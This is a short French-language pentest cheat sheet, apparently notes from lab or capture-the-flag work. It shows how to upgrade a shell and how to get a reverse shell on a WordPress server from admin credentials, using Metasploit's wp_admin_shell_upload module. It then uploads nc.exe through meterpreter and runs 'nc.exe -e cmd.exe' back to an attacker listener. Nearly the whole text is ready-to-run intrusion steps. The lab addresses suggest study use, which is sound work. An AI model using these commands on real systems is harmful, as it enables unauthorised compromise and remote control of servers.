# Shell et reverse shell

**Passer à un shell bash si shell pourri**
```
SHELL=/bin/bash script -q /dev/null
```

**Reverse-shell Wordpress**  

En cas d'accès à un wp-admin, possibilité de faire un reverse shell avec Metasploit :
```
msfconsole
msf > use exploit/unix/webapp/wp_admin_shell_upload
msf > set PASSWORD P@s5w0rd!
msf > set USERNAME admin
msf > set TARGETURI /wordpress
msf > set RHOSTS 10.10.10.29
msf > run
```

Puis avoir un shell propre :
```
meterpreter> lcd /home/username/Downloads
meterpreter> cd C:/inetpub/wwwroot/wordpress/wp-content/uploads
meterpreter > upload /usr/share/windows-binaries/nc.exe
```

En même temps, ouvrir un listener netcat dans un autre terminal : ```nc -lnvp 1234```.
```
meterpreter> execute -f nc.exe -a "-e cmd.exe 10.10.14.2 1234"
```

Un shell est accessible depuis le listener Netcat.